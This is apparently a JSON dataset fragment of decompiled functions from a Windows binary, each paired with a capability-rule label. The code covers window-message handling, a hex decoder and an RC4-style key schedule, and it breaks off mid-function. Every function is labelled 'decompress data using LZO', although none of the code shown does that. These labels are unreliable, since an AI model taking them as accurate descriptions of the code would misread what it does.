        "decompiled_code": "\nvoid __fastcall fcn.004458cc(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    code **ppcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x445f57;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack36;\n    param_2[3] = 0;\n    iVar7 = *(*(in_EAX + 0xb0) + 8);\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar7 + -1) {\n        do {\n            puStack28 = puVar1;\n            ppcVar3 = fcn.00419898();\n            cVar2 = (**ppcVar3)();\n            if (cVar2 != '\\0') {\n                *in_FS_OFFSET = iStack36;\n                return;\n            }\n            iVar7 = iVar7 + -1;\n            puVar1 = puStack28;\n        } while (iVar7 != 0);\n    }\n    fcn.00445780();\n    iVar7 = *param_2;\n    if (0x53 < iVar7) {\n        if (iVar7 < 0xb018) {\n            if (iVar7 == 0xb017) {\n                if ((*(in_EAX + 0x44) != 0) && (iVar7 = fcn.004585f8(),  iVar7 != 0)) {\n                    uVar5 = fcn.004585f8();\n                    iVar7 = sub.user32.dll_IsWindowEnabled(uVar5);\n                    if (iVar7 != 0) {\n                        uVar5 = fcn.004585f8();\n                        iVar7 = sub.user32.dll_IsWindowVisible(uVar5);\n                        if (iVar7 != 0) {\n                            *0x492508 = 0;\n                            uVar5 = sub.user32.dll_GetFocus();\n                            uVar6 = fcn.004585f8();\n                            sub.user32.dll_SetFocus(uVar6);\n                            fcn.00451b4c(param_2[2]);\n                            sub.user32.dll_SetFocus(uVar5);\n                            *0x492508 = 1;\n                            param_2[3] = 1;\n                        }\n                    }\n                }\n                goto code_r0x00445f4d;\n            }\n            if (iVar7 < 0xb001) {\n                if (iVar7 == 0xb000) {\n                    if (*(in_EAX + 0x13a) != 0) {\n                        (**(in_EAX + 0x138))();\n                    }\n                    if ((*(*0x499c1c + 0x44) != 0) && (cVar2 = fcn.0044821c(),  cVar2 != '\\0')) {\n                        iStack36 = fcn.004585f8();\n                        iVar7 = sub.user32.dll_IsWindowEnabled();\n                        if ((iVar7 == 0) && (iVar7 = fcn.004585f8(),  iVar7 != *0x499c44)) {\n                            iStack36 = *0x499c44;\n                            sub.user32.dll_SetFocus();\n                        }\n                    }\n                    *0x499c44 = 0;\n                    goto code_r0x00445f4d;\n                }\n                if (iVar7 == 0x112) {\n                    if ((param_2[1] & 0xfff0U) == 0xf020) {\n                        fcn.00445f90();\n                    }\n                    else if ((param_2[1] & 0xfff0U) == 0xf120) {\n                        fcn.00446070();\n                    }\n                    else {\n                        fcn.00445844(&stack0xfffffffc);\n                    }\n                    goto code_r0x00445f4d;\n                }\n                if (iVar7 - 0x132U < 7) {\n                    iVar7 = sub.user32.dll_SendMessageA(param_2[2], iVar7 + 0xbc00, param_2[1], param_2[2]);\n                    param_2[3] = iVar7;\n                    goto code_r0x00445f4d;\n                }\n                if (iVar7 - 0x132U == 0x1e8) {\n                    fcn.00432228();\n                    fcn.0043238c();\n                    goto code_r0x00445f4d;\n                }\n            }\n            else {\n                if (iVar7 == 0xb001) {\n                    *0x499c44 = sub.user32.dll_GetLastActivePopup(*(in_EAX + 0x30));\n                    if (*(in_EAX + 0x132) != 0) {\n                        (**(in_EAX + 0x130))();\n                    }\n                    goto code_r0x00445f4d;\n                }\n                if (iVar7 == 0xb016) {\n                    cVar2 = fcn.0044641c();\n                    if (cVar2 != '\\0') {\n                        param_2[3] = 1;\n                    }\n                    goto code_r0x00445f4d;\n                }\n            }\n        }\n        else if (iVar7 < 0xb021) {\n            if (iVar7 == 0xb020) {\n                if (param_2[1] == 0) {\n                    fcn.0044665c(*param_2[2], param_2[2][1]);\n                }\n                else {\n                    fcn.004466b8(*param_2[2], param_2[2][1]);\n                }\n                goto code_r0x00445f4d;\n            }\n            if (iVar7 == 0xb01a) {\n                iVar7 = fcn.0043b75c();\n                if (((iVar7 == 0) && (iVar7 = sub.user32.dll_GetFocus(),  iVar7 == *(in_EAX + 0x30))) &&\n                   (iVar7 = fcn.0043ba80(),  iVar7 != 0)) {\n                    sub.user32.dll_SetFocus(iVar7);\n                }\n                goto code_r0x00445f4d;\n            }\n            if (iVar7 == 0xb01f) goto code_r0x00445e7a;\n        }\n        else {\n            if (iVar7 == 0xb031) {\n                if (param_2[1] == 1) {\n                    param_2[3] = *(in_EAX + 0xb8);\n                }\n                else {\n                    *(in_EAX + 0xb8) = param_2[2];\n                }\n                goto code_r0x00445f4d;\n            }\n            if (iVar7 - 0xb03fU < 2) {\n                uVar4 = fcn.00447c6c();\n                param_2[3] = uVar4 & 0x7f;\n                goto code_r0x00445f4d;\n            }\n        }\n        goto code_r0x00445f46;\n    }\n    if (iVar7 == 0x53) {\ncode_r0x00445e7a:\n        fcn.00446a88();\n        goto code_r0x00445f4d;\n    }\n    if (iVar7 < 0x12) {\n    // switch table (17 cases) at 0x445970\n        switch(iVar7) {\n        case 0:\n            fcn.0041f7b4();\n            break;\n        case 1:\n        case 2:\n        case 3:\n        case 4:\n        case 6:\n        case 8:\n        case 9:\n        case 0xb:\n        case 0xc:\n        case 0xd:\n        case 0xe:\n            goto code_r0x00445f46;\n        case 5:\n            if (param_2[1] == 1) {\n                *0x499c2c = 1;\n            }\n            break;\n        case 7:\n            sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01a, 0, 0);\n            fcn.00445844(&stack0xfffffffc);\n            break;\n        case 10:\n            if (param_2[1] == 0) {\n                fcn.00445844(&stack0xfffffffc);\n                if ((*(in_EAX + 0xb4) == 0) && (*0x492520 == '\\0')) {\n                    uVar5 = fcn.0043b920();\n                    *(in_EAX + 0xb4) = uVar5;\n                }\n                fcn.00445438();\n            }\n            else {\n                if ((*0x492520 == '\\0') && (fcn.00445490(),  *(in_EAX + 0xb4) != 0)) {\n                    fcn.0043b9e4();\n                    *(in_EAX + 0xb4) = 0;\n                }\n                fcn.00445844(&stack0xfffffffc);\n            }\n            break;\n        case 0xf:\n            iVar7 = fcn.0043b75c();\n            if (iVar7 == 0) {\n                fcn.00445844(&stack0xfffffffc);\n            }\n            else {\n                fcn.00445880(&stack0xfffffffc);\n            }\n            break;\n        case 0x10:\n            if (*(in_EAX + 0x44) != 0) {\n                fcn.00442a04();\n            }\n            break;\n        default:\n            param_2[3] = 1;\n        }\n    }\n    else {\n        if (iVar7 < 0x1d) {\n            if (iVar7 == 0x1c) {\n                fcn.00445844(&stack0xfffffffc);\n                *(in_EAX + 0xa5) = '\\x01' - (param_2[1] == 0);\n                if (param_2[1] == 0) {\n                    fcn.00445430();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb001, 0, 0);\n                }\n                else {\n                    fcn.00445490();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb000, 0, 0);\n                }\n                goto code_r0x00445f4d;\n            }\n            if (iVar7 == 0x14) {\n                *param_2 = 0x27;\n                fcn.00445844(&stack0xfffffffc);\n                goto code_r0x00445f4d;\n            }\n            if (iVar7 == 0x16) {\n                if (param_2[1] != 0) {\n                    fcn.0040f320();\n                    fcn.00405388();\n                }\n                goto code_r0x00445f4d;\n            }\n            if (iVar7 == 0x1a) {\n                fcn.0045d684();\n                fcn.004457d8();\n                fcn.00445844(&stack0xfffffffc);\n                goto code_r0x00445f4d;\n            }\n        }\n        else {\n            if (iVar7 == 0x1d) {\n                fcn.004449c4();\n                fcn.00445844(&stack0xfffffffc);\n                goto code_r0x00445f4d;\n            }\n            if (iVar7 == 0x37) {\n                iVar7 = fcn.00445f74();\n                param_2[3] = iVar7;\n                goto code_r0x00445f4d;\n            }\n        }\ncode_r0x00445f46:\n        fcn.00445844(&stack0xfffffffc);\n    }\ncode_r0x00445f4d:\n    *in_FS_OFFSET = iStack36;\n    return;\n}\n",
        "token_count": 2664
    },
    "004461dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004461dc(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar auStack268 [244];\n    int32_t iStack24;\n    \n    if ((*(in_EAX + 0xac) == '\\0') || (cVar1 = fcn.0044821c(),  cVar1 != '\\0')) {\n        fcn.00405584();\n        return;\n    }\n    sub.user32.dll_GetWindowTextA(*(in_EAX + 0x30), auStack268, 0x100);\n    fcn.00405620();\n    iStack24 = *param_2;\n    iVar2 = iStack24;\n    if (iStack24 != 0) {\n        iVar2 = *(iStack24 + -4);\n    }\n    if (iVar2 != 0) {\n        return;\n    }\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 219
    },
    "004556f4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004556f4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    int32_t iStack72;\n    uint uVar6;\n    uint arg_ch;\n    uint var_34h;\n    uint lpEventTrack;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *param_2;\n    if (iVar4 < 0x100) {\n        if (0x1f < iVar4) {\n            if (iVar4 == 0x21) {\n                cVar1 = fcn.004554f4();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.00458904();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    fcn.00451c28();\n                    return;\n                }\n            }\n            else if (iVar4 == 0x84) {\n                fcn.00451c28();\n                if (param_2[3] != -1) {\n                    return;\n                }\n                arg_ch = 0;\n                uVar6 = 0;\n                iStack72 = 0x4558bb;\n                fcn.004503d4();\n                iStack72 = 0x4558c8;\n                iVar4 = fcn.00455430(uVar6, arg_ch);\n                if (iVar4 == 0) {\n                    return;\n                }\n                param_2[3] = 1;\n                return;\n            }\n            goto code_r0x00455be8;\n        }\n        if (iVar4 == 0x1f) {\n            iVar4 = fcn.004585f8();\n            iVar5 = sub.user32.dll_GetCapture();\n            if (((iVar4 == iVar5) && (*0x492710 != 0)) && (*(*0x492710 + 0x30) == in_EAX)) {\n                fcn.00451b4c(0);\n            }\n            goto code_r0x00455be8;\n        }\n        if (iVar4 == 7) {\n            piVar3 = fcn.0043bd90();\n            if (((piVar3 != NULL) && (((*(piVar3 + 7) & 0x10) == 0 || (piVar3[0xc] == 0)))) &&\n               (cVar1 = (**(*piVar3 + 0xf8))(),  cVar1 == '\\0')) {\n                return;\n            }\n            goto code_r0x00455be8;\n        }\n        if (iVar4 != 8) goto code_r0x00455be8;\n        uVar2 = *(in_EAX + 0x15) & 0x20;\n    }\n    else {\n        if (0xb047 < iVar4) {\n            if (iVar4 == 0xb04a) {\n                if (param_2[1] != '\\0') {\n                    fcn.00459998();\n                }\n                iStack72 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb8;\n                (**(*in_EAX + 0xb0))();\n                *in_FS_OFFSET = iStack72;\n                if (param_2[1] != '\\0') {\n                    fcn.00459998();\n                }\n                return;\n            }\n            if (((iVar4 == 0xb04e) && ((*(in_EAX + 7) & 0x10) != 0)) && (**0x494d24 != NULL)) {\n                iStack72 = 0x4557c6;\n                iStack72 = fcn.004585f8();\n                (***0x494d24)();\n                fcn.004585f8();\n                sub.user32.dll_SetWindowPos();\n            }\n            goto code_r0x00455be8;\n        }\n        if (iVar4 == 0xb047) {\n            piVar3 = fcn.0043bd90();\n            if ((piVar3 != NULL) && (piVar3 != in_EAX)) {\n                fcn.00451b4c(param_2[2]);\n            }\n            goto code_r0x00455be8;\n        }\n        if (9 < iVar4 - 0x100U) {\n            if (iVar4 - 0x200U < 0xb) {\n                if (iVar4 == 0x200) {\n                    fcn.00418420();\n                    fcn.00450324();\n                    iVar4 = fcn.0044d640();\n                    *0x492710 = iVar4;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.0044ee0c();\n                    }\n                    if (iVar4 != in_EAX[0x8f]) {\n                        if ((((in_EAX[0x8f] != 0) && (*0x492710 == 0)) ||\n                            ((*0x492710 != 0 && (in_EAX[0x8f] == *0x492710)))) ||\n                           ((*0x492710 != 0 && (*(*0x492710 + 0x30) == in_EAX[0x8f])))) {\n                            fcn.00451b4c(0);\n                        }\n                        if (in_EAX[0x8f] != 0) {\n                            fcn.004202d8();\n                        }\n                        in_EAX[0x8f] = iVar4;\n                        if (iVar4 != 0) {\n                            fcn.00420098();\n                        }\n                        if (((in_EAX[0x8f] != 0) && (*0x492710 == 0)) ||\n                           ((*0x492710 != 0 && (in_EAX[0x8f] == *0x492710)))) {\n                            iStack72 = 0x455a63;\n                            fcn.00451b4c(0);\n                        }\n                    }\n                    if (*(in_EAX + 0x8e) == '\\0') {\n                        *(in_EAX + 0x8e) = 1;\n                        fcn.004585f8();\n                        iStack72 = 0x455aa2;\n                        sub.comctl32.dll__TrackMouseEvent();\n                    }\n                }\n                cVar1 = fcn.00455640();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.00458904();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    iStack72 = param_2[1];\n                    uVar6 = fcn.004585f8(*param_2);\n                    sub.user32.dll_DefWindowProcA(uVar6);\n                    return;\n                }\n            }\n            else if (iVar4 - 0x200U == 0xa3) {\n                *(in_EAX + 0x8e) = 0;\n                if (in_EAX[0x8f] == 0) {\n                    fcn.00451b4c(0);\n                }\n                else {\n                    fcn.00451b4c(0);\n                }\n                in_EAX[0x8f] = 0;\n            }\n            goto code_r0x00455be8;\n        }\n        uVar2 = fcn.004510c0();\n    }\n    if (uVar2 != 0) {\n        return;\n    }\ncode_r0x00455be8:\n    fcn.00451c28();\n    if (*param_2 == 0x128) {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 1773
    },
    "00456c00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00456c65)\n\nvoid fcn.00456c00(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x456d1f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x494d28 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.004441f8();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.004059dc(0);\n            uVar2 = fcn.004059dc(iVar3, uVar2);\n            in_stack_ffffffc4 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                piVar4 = fcn.00443ff8();\n                iVar3 = (**(*piVar4 + 0x14))();\n                puVar1 = puStack28;\n                if (iVar3 != 0) {\n                    in_stack_ffffffc4 = *(**0x494cfc + 0x3c);\n                    if (*(in_EAX + 0x1b8) != '\\0') {\n                        piVar4 = fcn.00443ff8();\n                        iVar3 = (**(*piVar4 + 0x54))();\n                        if (-1 < iVar3) {\n                            piVar4 = fcn.00443ff8();\n                            in_stack_ffffffc4 = (**(*piVar4 + 0x18))();\n                        }\n                    }\n                    sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffc4, 1);\n                    puVar1 = puStack28;\n                }\n            }\n        }\n        puStack28 = puVar1;\n        fcn.004585f8();\n        fcn.0045d96c();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.00405530(0x456d26);\n    return;\n}\n",
        "token_count": 634
    },
    "00456d30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00456d91)\n\nvoid fcn.00456d30(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffbc;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x456dff;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x494d28 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.004441f8();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.004059dc(0);\n            uVar2 = fcn.004059dc(iVar3, uVar2);\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                in_stack_ffffffbc = *(**0x494cfc + 0x3c);\n                sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffbc, 1);\n                puVar1 = puStack28;\n            }\n        }\n        puStack28 = puVar1;\n        puVar1 = puStack28;\n        if (*(in_EAX + 0x1b8) == '\\0') {\n            fcn.004585f8();\n            fcn.0045d950();\n            puVar1 = puStack28;\n        }\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffbc;\n    fcn.00405530(0x456e06);\n    return;\n}\n",
        "token_count": 491
    },
    "004597b4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004597b4(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043bd90();\n    if (iVar1 == 0) {\n        return;\n    }\n    if (param_2 != 9) {\n        if (param_2 == 0x12) {\n            fcn.00451b4c(0);\n            return;\n        }\n        if (3 < param_2 - 0x25U) {\n            return;\n        }\n    }\n    fcn.00451b4c(0);\n    return;\n}\n",
        "token_count": 139
    },
    "00459dc8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459dc8(int32_t param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_18h = *param_2;\n    var_14h = param_2[1];\n    iVar4 = param_2[3];\n    *(in_EAX + 0x96) = 1;\n    uStack56 = 0x459fac;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = in_EAX;\n    fcn.004508c4();\n    fcn.00451bf4();\n    iVar2 = fcn.00443da8();\n    if (iVar2 < var_4h[0x13] + var_14h) {\n        var_14h = fcn.00443da8();\n        var_14h = var_14h - var_4h[0x13];\n    }\n    iVar2 = fcn.00443db4();\n    if (iVar2 < var_4h[0x12] + var_18h) {\n        var_18h = fcn.00443db4();\n        var_18h = var_18h - var_4h[0x12];\n    }\n    iVar2 = fcn.00443d9c();\n    if (var_18h < iVar2) {\n        var_18h = fcn.00443d9c();\n    }\n    iVar2 = fcn.00443d90();\n    if (iVar4 + 4 < iVar2) {\n        fcn.00443d90();\n    }\n    uVar3 = fcn.004585f8(0xffffffff, var_18h, var_14h, var_4h[0x12], var_4h[0x13], 0x10);\n    sub.user32.dll_SetWindowPos(uVar3);\n    iVar4 = sub.kernel32.dll_GetTickCount_1();\n    if (iVar4 - var_4h[0x97] < 0xfb) {\n        bVar1 = false;\n    }\n    else {\n        if (param_1 != 0) {\n            param_1 = *(param_1 + -4);\n        }\n        bVar1 = param_1 < 100;\n    }\n    if ((bVar1) && (*0x49264c != NULL)) {\n        sub.user32.dll_SystemParametersInfoA(0x1016, 0, &var_8h, 0);\n        if (var_8h != 0) {\n            sub.user32.dll_SystemParametersInfoA(0x1018, 0, &var_8h, 0);\n            if (var_8h == 0) {\n                fcn.0045d588();\n                if (var_14h < var_1ch) {\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 1;\n                }\n            }\n            else {\n                iVar4 = 2;\n            }\n            uVar3 = fcn.004585f8(100, *(iVar4 * 4 + 0x492754) | 0x40000);\n            (**0x49264c)(uVar3);\n        }\n    }\n    fcn.00455208();\n    uVar3 = fcn.004585f8(4);\n    sub.user32.dll_ShowWindow();\n    (**(*var_4h + 0x80))();\n    *in_FS_OFFSET = uVar3;\n    iVar4 = sub.kernel32.dll_GetTickCount_1(0x459fb3);\n    var_4h[0x97] = iVar4;\n    *(var_4h + 0x96) = 0;\n    return;\n}\n",
        "token_count": 944
    },
    "0045c3c8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c3c8(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x45c3da;\n    fcn.004059cc();\n    uStack24 = 0x45c437;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack20 = &stack0xfffffffc;\n    (**(**(arg_8h + -4) + 0x10))();\n    if (0 < in_EAX) {\n        (**(**(arg_8h + -4) + 0x10))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x45c43e;\n    uStack24 = 0x45c436;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 261
    },
    "0045f550": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0045f550(void)\n\n{\n    fcn.004059dc();\n    fcn.0045f5c0();\n    fcn.0045f740();\n    return;\n}\n",
        "token_count": 44
    },
    "004611cc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004611cc(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x46123d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (0 < in_EAX) {\n        do {\n            fcn.00409e84();\n            fcn.00405818();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x461244;\n    uStack32 = 0x46123c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 231
    },
    "0046124c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046124c(uint param_1, int32_t *param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x461262;\n    fcn.004059cc();\n    uStack32 = 0x4613ca;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_EAX;\n    if (in_EAX != 0) {\n        uVar1 = *(in_EAX - 4);\n    }\n    uVar1 = uVar1 & 0x80000001;\n    if (uVar1 < 0) {\n        uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n    }\n    if (uVar1 == 0) {\n        puStack28 = &stack0xfffffffc;\n        fcn.00405c6c();\n        iVar4 = *param_2;\n        if (iVar4 != 0) {\n            iVar4 = *(iVar4 + -4);\n        }\n        if (0 < iVar4) {\n            iVar3 = 1;\n            do {\n                if (*((in_EAX - 2) + iVar3 * 2) - 0x30U < 10) {\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 2) + iVar3 * 2) + -0x30;\n                }\n                else {\n                    if (5 < *((in_EAX - 2) + iVar3 * 2) + 0xbfU) break;\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 2) + iVar3 * 2) + -0x37;\n                }\n                iVar2 = fcn.00405a3c();\n                *(iVar2 + -1 + iVar3) = *(*param_2 + -1 + iVar3) << 4;\n                if (*((in_EAX - 1) + iVar3 * 2) - 0x30U < 10) {\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 1) + iVar3 * 2) + *(*param_2 + -1 + iVar3) + -0x30;\n                }\n                else {\n                    if (5 < *((in_EAX - 1) + iVar3 * 2) + 0xbfU) break;\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 1) + iVar3 * 2) + *(*param_2 + -1 + iVar3) + -0x37;\n                }\n                iVar3 = iVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4613d1;\n    uStack32 = 0x4613c9;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 781
    },
    "004613d8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004613d8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    int32_t var_1ch;\n    uint8_t var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    puStack1076 = 0x461403;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack1076 = 0x46140b;\n    fcn.004059cc();\n    uStack1080 = 0x4616a5;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbc4;\n    iVar4 = var_8h;\n    if (var_8h != 0) {\n        iVar4 = *(var_8h + -4);\n    }\n    if (iVar4 != 0) {\n        iVar4 = var_4h;\n        if (var_4h != 0) {\n            iVar4 = *(var_4h + -4);\n        }\n        if (iVar4 != 0) {\n            iVar4 = var_8h;\n            if (var_8h != 0) {\n                iVar4 = *(var_8h + -4);\n            }\n            if (iVar4 < 0x101) {\n                iVar4 = var_8h;\n                if (var_8h != 0) {\n                    iVar4 = *(var_8h + -4);\n                }\n                puStack1076 = &stack0xfffffffc;\n                fcn.00406928(iVar4);\n                fcn.00405a3c();\n                fcn.004611c4();\n            }\n            else {\n                puStack1076 = &stack0xfffffffc;\n                fcn.00406928(0x100);\n                fcn.00405a3c();\n                fcn.004611c4();\n            }\n            iVar4 = 0;\n            piVar1 = &fcn.004613d8::var_41ch;\n            do {\n                *piVar1 = iVar4;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            iVar4 = 0;\n            piVar1 = &fcn.004613d8::var_41ch;\n            do {\n                iVar5 = var_8h;\n                if (var_8h != 0) {\n                    iVar5 = *(var_8h + -4);\n                }\n                uVar3 = *(var_ch + iVar4 % iVar5) + uVar3 + *piVar1 & 0x800000ff;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                }\n                var_15h = *piVar1;\n                *piVar1 = (&fcn.004613d8::var_41ch)[uVar3];\n                (&fcn.004613d8::var_41ch)[uVar3] = var_15h;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            uVar6 = 0;\n            iVar4 = var_4h;\n            if (var_4h != 0) {\n                iVar4 = *(var_4h + -4);\n            }\n            fcn.00406928(iVar4);\n            fcn.00405a3c();\n            fcn.004611c4();\n            if (var_4h != 0) {\n                var_4h = *(var_4h + -4);\n            }\n            if (-1 < var_4h + -1) {\n                var_1ch = var_4h;\n                iVar4 = 0;\n                do {\n                    uVar3 = uVar3 + 1 & 0x800000ff;\n                    if (uVar3 < 0) {\n                        uVar3 = (uVar3 - 1 | 